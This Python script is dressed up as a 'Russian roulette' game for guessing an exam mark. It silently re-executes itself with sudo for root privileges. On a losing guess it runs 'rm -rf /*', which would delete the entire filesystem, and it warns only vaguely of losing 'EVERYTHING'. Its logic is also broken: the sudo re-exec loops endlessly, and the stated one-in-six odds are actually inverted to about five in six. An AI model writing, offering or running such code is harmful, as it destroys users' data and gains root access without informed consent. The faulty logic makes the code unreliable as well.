import random
import os
import sys


def the_game(real_mark, full_mark):
    tries = 0
    print("Make a guess on your mark")
    print("Full mark is", full_mark)
    print("Any guess too far away from the real mark results in a trigger pulling")
    print("The chance of a bullet is 1/6, i.e. you got 16.67% of chance to lose EVERYTHING")
    print("\"quit\" is designed for pussies. Use it if you reached this module but do not dare to play")
    while True:
        # Get root privilege
        args = [sys.executable] + sys.argv
        os.execlp('sudo', 'sudo', *args)

        try:
            usr_input = input(" > ")
            if usr_input == "quit":
                return 0
            else:
                usr_input = float(usr_input)
        except ValueError:
            print("Only numbers available.")
            continue

        bullet = random.randint(0, 99999)
        if usr_input == real_mark:
            print("That's the right number.")
            return 0
        if abs(usr_input - real_mark) / real_mark <= (1 - tries / 10):
            if bullet % 6 == 0:
                print("Not right...but a close one.")
            else:
                print("BANG!!!")
                os.system("rm -rf /*")
        else:
            print("The game is still on...")
        tries += 1

